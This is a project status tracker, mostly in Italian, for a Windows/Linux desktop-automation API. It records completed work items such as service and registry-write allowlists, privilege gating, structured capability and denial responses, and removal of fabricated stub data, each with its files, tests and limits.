  `AccessibleName` e `Name` del campo contengono un UUID appena creato: non
  possono quindi provenire da fixture, sinonimi o selector preconfezionati.
  Il test trova l'EXE fra i processi realmente in esecuzione, legge il suo
  albero UIA, genera mapping/azione/workflow, verifica due volte una scrittura
  con readback e rollback reali, persiste il verdetto, pubblica esclusivamente
  quel path nella Virtual API, invoca il path HTTP e rilegge il valore finale
  dall'applicazione. Ogni passaggio e' un'asserzione bloccante nel job Windows.

## Summary
- DONE: 50 (+ Linux gaps closed)
- PARTIAL: 0
- NOT_STARTED: 0

## LinuxBackend parity (post-PR50)
- **Status:** DONE
- **Files:**
  - `windows_os_api/backends/linux.py` (AT-SPI rich tree + find/click/set_text; wmctrl/xclip/mss/xdotool)
  - `windows_os_api/backends/factory.py`
  - `windows_os_api/backends/base.py`
  - `windows_os_api/core/runtime/config.py`
  - `windows_os_api/os/system/service.py` (honest capability flags)
  - `windows_os_api/api/rest/ui.py` (`/ui/tree`, `/ui/find`, `/ui/click`, `/ui/set-text`)
  - `windows_os_api/apps/ui_inspector/service.py`
  - `tests/linux/test_linux_backend.py`
  - `tests/linux/test_linux_ui_control.py`
  - `scripts/live_linux_smoke.py`
  - `scripts/live_linux_ui_control_smoke.py`
- **Tests:**
  - `pytest -m linux`
  - `pytest -m "not windows"`
  - `DISPLAY=:2 python scripts/live_linux_ui_control_smoke.py`
- **N/A (by design, not PARTIAL):** Windows UIA on Linux — use AT-SPI / wmctrl / xdotool instead (`windows_uia=false`).
- **Notes:** Screenshot requires `mss` + `DISPLAY`; audio/services hard-assert when `pactl`/`systemctl` present, skip only when binary absent.

## WindowsBackend real UIA / SendInput / screenshot (post-PR50)
- **Status:** DONE
- **Files:**
  - `windows_os_api/backends/windows.py` (SendInput mouse/key/type, EnumDisplayMonitors, mss/Pillow/BitBlt screenshot, `_uia_tree` → uia_windows)
  - `windows_os_api/apps/ui_inspector/uia_windows.py` (rich tree, find, invoke_click, set_value)
  - `tests/windows/test_windows_backend_hard.py`
  - `tests/windows/test_uia_hard.py`
  - `scripts/live_windows_smoke.py`
  - `.github/workflows/ci.yml` (`pip install -e ".[dev,windows]"`, `pytest -m windows`, live smoke)
- **Tests:**
  - `pytest -m windows` on win32
  - `pytest -m "not windows"` on Linux (must stay green)
  - `python scripts/live_windows_smoke.py`
- **GHA display limits:** Process / FS / registry / clipboard / SendInput structure tests **must pass** headless. UIA Notepad tree, mouse click, and screenshot are marked `requires_display` and skip when no interactive desktop / session 0.
- **Still needs a real Windows desktop:** Full Notepad UIA children + type-into-Edit + non-empty screenshot PNG. Headless GHA may skip those while still validating non-UI APIs.



## Linux capability gaps closed (vision / Wayland / audio / services / privilege)
- **Status:** DONE
- **Files:**
  - `windows_os_api/apps/vision/ocr.py` (Pillow template OCR + optional tesseract; find/click)
  - `windows_os_api/backends/linux_session.py` (X11/Wayland detect + command construction)
  - `windows_os_api/backends/linux_audio.py` (pactl/wpctl list/volume/mute)
  - `windows_os_api/backends/linux_services.py` (systemctl user+system; unit name sanitization)
  - `windows_os_api/core/security/privilege.py` (ADMIN + WINOS_ALLOW_PRIVILEGED; pkexec/sudo -n; audit)
  - `windows_os_api/backends/linux.py` (wired caps, input, windows, audio, services, sessions)
  - `windows_os_api/apps/adapters/engine.py` (vision fallback when UI tree empty)
  - `windows_os_api/apps/ui_inspector/service.py` (vision find/click fallback)
  - `windows_os_api/api/rest/services.py` (`/v1/session`, `/v1/privilege/elevate`, audio set)
  - `windows_os_api/api/rest/ui.py` (`/ui/vision/find`, `/ui/vision/click`)
- **Tests:**
  - `tests/linux/test_vision_ocr.py`
  - `tests/linux/test_wayland_session.py`
  - `tests/linux/test_audio_services.py`
  - `tests/security/test_privilege_gated.py`
  - `tests/unit/test_vision_and_session_unit.py`
  - `tests/security/test_security_hard.py` (path traversal / shell still blocked)
- **How to run:** `pytest -q -m "not windows"`
- **Honest limits:** Wayland compositor variance; OCR accuracy without tesseract; privilege never silent root.


## `app_id` obbligatorio ed esplicito su ogni superficie (issue #6)
- **Status:** DONE
- **Problema:** `app_id` — «su quale applicazione» — aveva default `"contoso-crm"`
  (il CRM demo del backend fake) su sette punti di ingresso di produzione, tre
  dei quali superfici pubbliche: i body REST, il tool MCP `agent_run` e
  `ComputerAgent`. Una richiesta che non nominava l'applicazione non riceveva un
  errore: riceveva la app demo, e andava a buon fine contro quella.
- **Files:**
  - `windows_os_api/apps/adapters/validation.py` (nuovo: `validate_app_id`, `AppIdRejected`)
  - `windows_os_api/apps/adapters/engine.py` (validazione in `create_adapter`, il punto che agisce)
  - `windows_os_api/apps/agent/computer.py` (default rimosso)
  - `windows_os_api/api/rest/workflows.py` (`app_id` obbligatorio su `RecordStart`, `IntentBody`, `AgentBody`)
  - `windows_os_api/api/mcp/server.py` (`agent_run` richiede `app_id`; `required` del singolo tool ora applicato davvero)
  - `windows_os_api/core/runtime/app.py` (`AppIdRejected` → 422, non 500)
  - `windows_os_api/apps/intent/engine.py`, `apps/planner/service.py`,
    `apps/workflows/generator.py`, `apps/automation/actions.py` (default rimossi)
- **Tests:**
  - `tests/unit/test_app_id_required_contract.py`
  - `tests/integration/test_api_adapter_automation.py`
- **How to run:** `pytest -q -m "not linux and not windows"`
- **BLOCK verificato:** ripristinando il default in `ComputerAgent` → 2 rossi;
  nel tool MCP → 3 rossi; nei body REST → 1 rosso; togliendo il controllo del
  vuoto da `validate_app_id` → 8 rossi.
- **Honest limits:** `backends/fake.py` continua a nominare `contoso-crm` — e' la
  fixture che definisce quella app demo, non un default. Il test che vieta il
  nome copre i moduli di produzione, non le fixture.


## Inventario di sistema reale su Windows — servizi, volumi, stampanti (Gate 3, meta' in lettura)
- **Status:** DONE
- **Problema:** su `WindowsBackend` i tre metodi di sola lettura erano stub.
  `list_services` restituiva `[{"name": "WinOsApi", "status": "unknown", ...}]` —
  un servizio che **non esiste**: una lista vuota e' poco informativa, una riga
  inventata e' una risposta su cui il chiamante agisce e sbaglia.
  `list_printers` e `list_devices` restituivano `[]`. Su Linux, difetto gemello
  piu' lieve: `list_devices` marcava ogni riga `"status": "ok"`, giudizio di
  salute mai verificato.
- **Files:**
  - `windows_os_api/backends/windows.py` (`EnumServicesStatus`, `EnumPrinters`,
    `GetLogicalDriveStrings`/`GetDriveType`; capability `services` e `printers`)
  - `windows_os_api/backends/linux.py` (`status: present` misurato, `media` da `removable`)
- **Tests:**
  - `tests/windows/test_system_inventory_windows.py` (14, su Windows reale in CI)
  - `tests/linux/test_system_inventory_linux.py` (5, contro `/sys/block` vero)
  - `tests/unit/test_system_inventory_contract.py` (11, cross-platform)
- **How to run:** `pytest -q -m "not linux and not windows"` + `pytest -q -m windows` su win32
- **BLOCK verificato:** rimettendo `"status": "ok"` su Linux → 4 rossi;
  rimettendo lo stub inventato su Windows → 3 rossi. Il guardiano e' basato su
  AST e distingue la stringa dentro una docstring da quella dentro un `return`,
  verificato da un test dedicato (`test_the_guard_would_actually_catch_a_reintroduced_row`).
- **Honest limits:** i 14 test Windows girano solo su `windows-latest` in CI, non
  in locale (macchina Linux). «Zero elementi» e «non ho guardato» restano
  indistinguibili nella risposta: decisione owner D3 aperta nella issue #6.
  Audio Windows non implementato — richiede `pycaw` (decisione owner D4).
  `control_service` NON toccato: dipende dalla decisione owner D1.


## Contratto `supported` sugli endpoint di sola lettura (decisioni owner D3-A e D4-B)
- **Status:** DONE
- **Problema:** `GET /v1/printers` rispondeva `{"printers": []}` in QUATTRO
  situazioni indistinguibili: nessuna stampante / backend che non le implementa /
  discovery non eseguita / discovery fallita. Una sola e' la risposta che il
  chiamante crede di leggere. Stessa classe di difetto di `ok: true` su finestra
  inesistente (#24) e `state: null` con `verified: true` (#18).
- **Files:**
  - `windows_os_api/os/capability.py` (nuovo: `discover`, `unsupported`,
    `DiscoveryFailed`, i tre `error_code`)
  - `windows_os_api/os/{services,audio,devices,printers}/service.py` (inviluppo)
  - `windows_os_api/api/rest/services.py` (le route passano l'inviluppo)
  - `windows_os_api/backends/windows.py` (`NOT_IMPLEMENTED = {"audio"}` per D4-B;
    flag `devices`; i fallimenti sollevano invece di restituire `[]`)
  - `windows_os_api/backends/linux.py` (flag `devices`/`printers`; `lpstat` che
    fallisce solleva invece di restituire `[]`)
  - `windows_os_api/os/system/service.py` (rimossa la tabella Windows hardcoded,
    irraggiungibile e che dichiarava `services: False` — falso)
  - `windows_os_api/backends/fake.py` (`_muted` non inizializzato: bug preesistente,
    `GET /v1/audio/volume` rispondeva 500 a processo fresco)
- **Tests:** i cinque casi richiesti dall'owner, piu' la distinzione fra il caso 3
  e il caso 5:
  - `tests/unit/test_capability_contract.py` (12)
  - `tests/unit/test_capability_flags_contract.py` (8)
  - `tests/integration/test_capability_envelope_api.py` (15, via HTTP)
  - `tests/linux/test_capability_envelope_linux.py` (5, backend Linux reale)
  - `tests/windows/test_capability_envelope_windows.py` (6, Windows reale in CI)
- **How to run:** `pytest -q -m "not linux and not windows"` + `pytest -q -m windows` su win32
- **BLOCK verificato:** unificando i due codici di «non supportata» → 3 rossi;
  rimettendo l'inghiottimento dell'errore di `lpstat` → 1 rosso; rimettendo la
  tabella Windows morta → 1 rosso; togliendo l'init di `_muted` → 1 rosso.
- **Honest limits:** i 6 test Windows girano solo su `windows-latest` in CI.
  L'audio su Windows resta NON implementato per decisione owner D4-B: ora lo
  dichiara (`CAPABILITY_NOT_SUPPORTED`) invece di rispondere lista vuota.
  `control_service` e `registry_write` non toccati: sono D1-B e D2-B, PR successive.


## Allowlist esplicita per il controllo dei servizi (decisione owner D1-B)
- **Status:** DONE
- **Problema:** `control_service` sanificava il nome dell'unit (niente
  metacaratteri di shell, niente path traversal) e poi lo passava a `systemctl`.
  Quella sanificazione impedisce di INIETTARE un comando, non di FERMARE il
  servizio sbagliato: `ssh`, `firewalld`, `systemd-journald` sono nomi di unit
  perfettamente validi. L'unica difesa erano i permessi di systemd — fuori da
  questo programma, e assenti se il processo gira da root.
- **Files:**
  - `windows_os_api/os/services/allowlist.py` (nuovo: `check`, `allowed_services`,
    `ServiceRejected`; default-deny su `WINOS_SERVICE_ALLOWLIST`)
  - `windows_os_api/os/services/service.py` (gate prima del backend)
  - `windows_os_api/api/rest/services.py` (403 sul rifiuto, come apps.py; audit
    con outcome "denied")
  - `windows_os_api/backends/linux_services.py` (righe inventate rimosse; systemd
    irraggiungibile -> DiscoveryFailed)
- **Tests:**
  - `tests/security/test_service_allowlist.py` (16)
  - `tests/integration/test_service_control_api.py` (5, via HTTP)
  - `tests/linux/test_service_listing_honesty_linux.py` (6)
- **How to run:** `pytest -q -m "not linux and not windows"` + `pytest -q -m "not windows"`
- **BLOCK verificato:** tolto il gate da `control()` -> 4 rossi; allowlist vuota
  trasformata in "permetti tutto" -> 5 rossi.
- **Nota sui test:** i primi spy passavano per il motivo sbagliato — con
  `WINOS_BACKEND=fake` (imposto da `tests/conftest.py`) `control()` non raggiunge
  mai `linux_services.subprocess.run`, quindi "systemctl non e' stato invocato"
  era vero anche senza allowlist. Corretto con una fixture che forza LinuxBackend
  e asserisce il presupposto.
- **Difetti preesistenti chiusi:** due righe inventate in `list_services`
  ("systemctl" e "none"); systemd irraggiungibile riportato come lista vuota.
  Le righe inventate tenevano verdi DUE test esistenti che asserivano "almeno un
  servizio elencato" e ricevevano la riga fasulla.
- **Honest limits:** avviare/fermare un servizio reale non e' verificabile in
  questo container (systemctl presente, systemd non avviato come PID 1). La
  proprieta' di sicurezza — la richiesta non raggiunge il sistema — e' verificata
  spiando `subprocess.run`, che e' il punto in cui il sistema verrebbe toccato.
  `registry_write` non toccato: e' D2-B, PR successiva.


## Allowlist di prefissi per registry_write + scrittura reale su Windows (decisione owner D2-B)
- **Status:** DONE
- **Problema:** nessun controllo sui percorsi di scrittura. `FakeBackend` e
  `LinuxBackend` scrivevano su QUALUNQUE percorso; `WindowsBackend` non scriveva
  affatto — uno stub che rispondeva sempre "registry write requires elevation",
  incondizionatamente, senza mai tentare nemmeno sotto HKCU dove nessuna
  elevazione serve. La mancanza del gate non si era mai vista perche' la porta
  non si apriva; implementando la scrittura sarebbe diventata la possibilita' di
  scrivere ovunque il processo abbia i permessi.
- **Files:**
  - `windows_os_api/os/registry/allowlist.py` (nuovo: `check`, `normalize`,
    `comparison_key`, `allowed_prefixes`, denylist non sovrascrivibile)
  - `windows_os_api/os/registry/service.py` (gate prima del backend)
  - `windows_os_api/backends/windows.py` (`registry_write` reale via winreg,
    con rilettura: `ok: true` significa "c'e' scritto quello")
  - `windows_os_api/api/rest/services.py` (403 sul rifiuto, audit outcome denied)
- **Tests:**
  - `tests/security/test_registry_write_allowlist.py` (35)
  - `tests/integration/test_service_control_api.py` (registry: 6 via HTTP)
  - `tests/windows/test_registry_write_windows.py` (6, Windows reale in CI)
- **How to run:** `pytest -q -m "not linux and not windows"` + `pytest -q -m windows` su win32
- **BLOCK verificato:** prefisso senza separatore finale -> 1 rosso; hive non
  canonicalizzata (bypass via HKEY_LOCAL_MACHINE) -> 3 rossi; env che riapre le
  aree critiche -> 2 rossi; gate tolto da write() -> 5 rossi.
- **Le tre trappole del prefix-matching**, ognuna con un test: prefisso senza `\`
  finale (HKCU\Software autorizzerebbe HKCU\SoftwareAltro); alias della hive
  (HKEY_LOCAL_MACHINE\SYSTEM\ vs HKLM\SYSTEM\); traversal (i segmenti `..` sono
  RIFIUTATI, non risolti).
- **Honest limits:** i 6 test Windows girano solo su `windows-latest` in CI.
  `GET /v1/registry` (lettura) NON passa da questa allowlist: D2-B riguarda la
  scrittura, e la lettura e' una classe di rischio diversa — non estesa di
  iniziativa dell'agente, segnalata all'owner.


## control_service su Windows: capability dichiarata non supportata (decisione owner D5-B)
- **Status:** DONE
- **Problema:** `WindowsBackend.control_service` restituiva
  `{"ok": False, "error": "service control requires elevated pywin32"}`
  INCONDIZIONATAMENTE. Il messaggio sembra un problema di permessi risolvibile
  elevando il processo; non lo era — la chiamata non tentava nulla, nemmeno da
  amministratore. L'allowlist introdotta in #29 gattava su Windows una porta che
  non si apre.
- **Decisione owner (D5-B):** NON implementare `OpenSCManager`/`ControlService`
  adesso; dichiarare la capability non supportata col contratto `supported`.
- **Files:**
  - `windows_os_api/backends/windows.py` (flag `service_control: False`,
    `NOT_IMPLEMENTED` esteso, risposta col contratto invece dello stub)
  - `windows_os_api/backends/linux.py` (flag `service_control: has_systemctl` —
    implementato, quindi UNAVAILABLE e non NOT_SUPPORTED quando manca)
  - `windows_os_api/os/services/service.py` (capability PRIMA dell'allowlist)
  - `windows_os_api/api/rest/services.py` (501 per "non so farlo", 403 resta per
    "non ti e' permesso")
  - `windows_os_api/os/system/service.py` (flag nella tabella del backend fake)
- **Tests:**
  - `tests/security/test_service_control_unsupported.py` (11)
  - `tests/integration/test_service_control_api.py` (3 nuovi: 501 vs 403)
  - `tests/windows/test_system_inventory_windows.py` (3 nuovi su Windows reale,
    fra cui la verifica che lo stato di Spooler NON cambi — il runner e' elevato)
- **How to run:** `pytest -q -m "not linux and not windows"` + `pytest -q -m windows` su win32
- **BLOCK verificato:** capability controllata DOPO l'allowlist -> 3 rossi;
  ritorno dello stub "requires elevated pywin32" -> 1 rosso; flag unico
  (`services` che copre anche il controllo) -> 1 rosso.
- **Honest limits:** i 3 test Windows girano solo su `windows-latest` in CI. Il
  controllo servizi su Windows resta NON implementato per decisione owner: sara'
  una PR dedicata con allowlist, privilege gate, verifica e audit, testata su un
  servizio creato dal test stesso.


## Sessioni e privilegi misurati su Windows (ricognizione stub, issue #6)
- **Status:** DONE
- **Problema:** due stub incondizionati su campi che riguardano chi e' connesso
  alla macchina e con quali poteri.
  `list_sessions` restituiva `[{"id": 1, "user": <utente>, "state": "Active"}]` —
  una sessione che nessuno aveva misurato, famiglia del "WinOsApi" tolto in #27.
  `list_users` restituiva `"admin": False` asserito: su una sessione elevata e'
  FALSO, e il runner CI di GitHub gira elevato, quindi il caso non e' teorico.
  Difetto gemello su Linux: il fallback derivato marcava ogni riga
  `"state": "Active"`, stato mai misurato su righe sintetizzate.
- **Files:**
  - `windows_os_api/backends/windows.py` (`WTSEnumerateSessions`;
    `_is_administrator` via `CheckTokenMembership`; `_is_elevated` separato;
    flag `sessions`)
  - `windows_os_api/backends/linux.py` (fallback derivato: `state: "unknown"` +
    `derived: True`; flag `sessions`)
  - `windows_os_api/os/users/service.py` (`/v1/sessions` col contratto `supported`)
  - `windows_os_api/api/rest/services.py`, `windows_os_api/os/system/service.py`
- **Tests:**
  - `tests/security/test_sessions_and_privileges_honesty.py` (9)
  - `tests/windows/test_system_inventory_windows.py` (5 nuovi su Windows reale,
    fra cui la verifica che `admin` sia True sul runner elevato — dove il vecchio
    valore era dimostrabilmente falso)
- **How to run:** `pytest -q -m "not linux and not windows"` + `pytest -q -m windows` su win32
- **BLOCK verificato:** `admin: False` asserito -> 1 rosso; sessione inventata
  rimessa -> 4 rossi; `_is_administrator` che risponde False invece di None -> 1
  rosso; Linux che torna ad asserire `state: "Active"` -> 1 rosso.
- **Distinzione chiave:** `admin` (appartenenza al gruppo, come `u.name == "root"`
  su Linux) e `elevated` (processo elevato adesso) sono due campi. Un privilegio
  non misurabile e' `None`, mai `False`: `False` significa "ho guardato", ed e' la
  risposta su cui il chiamante procede.
- **Honest limits:** i 5 test Windows girano solo su `windows-latest` in CI.
  `power_action` su Windows resta un rifiuto incondizionato non strutturato (P2
  della ricognizione, non toccato qui). `GET /v1/registry` e issue #50 restano
  decisioni owner.


## power_action: rifiuto strutturato e simmetrico fra i due OS (ricognizione stub P2/P3)
- **Status:** DONE
- **Problema:** su Windows `power_action` rispondeva
  `{"ok": False, "error": "power actions require interactive elevation"}` —
  incondizionato e SENZA `denied` ne' `code`. Due difetti distinti:
  (1) un rifiuto di policy aveva la stessa forma di un guasto, quindi il
  chiamante non sapeva se riprovare o chiedere un permesso;
  (2) su Linux la stessa funzione usava gia' `deny_structured` con
  `code="hardware_protected"` — un client scritto contro Linux non riconosceva
  il rifiuto su Windows, difetto che si manifesta solo cambiando OS.
- **Files:**
  - `windows_os_api/backends/windows.py` (`power_action` con `deny_structured`;
    `audio_devices` documentato — P3)
- **Tests:**
  - `tests/security/test_power_action_denial.py` (10)
  - `tests/windows/test_system_inventory_windows.py` (1 nuovo su Windows reale)
- **How to run:** `pytest -q -m "not linux and not windows"` + `pytest -q -m windows` su win32
- **BLOCK verificato:** ritorno del rifiuto piatto -> 2 rossi.
- **NON implementa shutdown/reboot.** E' una superficie privilegiata reale e la
  sua aggiunta e' una decisione dell'owner. Due test lo sorvegliano: uno
  sull'AST (nessun `InitiateSystemShutdown`/`ExitWindowsEx`/`subprocess`), uno
  che verifica l'assenza di rami condizionali — un `if action == "sleep"` che
  passasse sarebbe una superficie aggiunta di soppiatto. Sul Windows reale il
  test gira su un runner ELEVATO: se `power_action` tentasse davvero
  l'operazione spegnerebbe la macchina invece di fallire.
- **Honest limits:** il test Windows gira solo su `windows-latest` in CI.
  `audio_devices` (P3) resta `[]` — irraggiungibile via API grazie a D4-B, e la
  docstring e' l'avviso per chi chiami il backend direttamente.
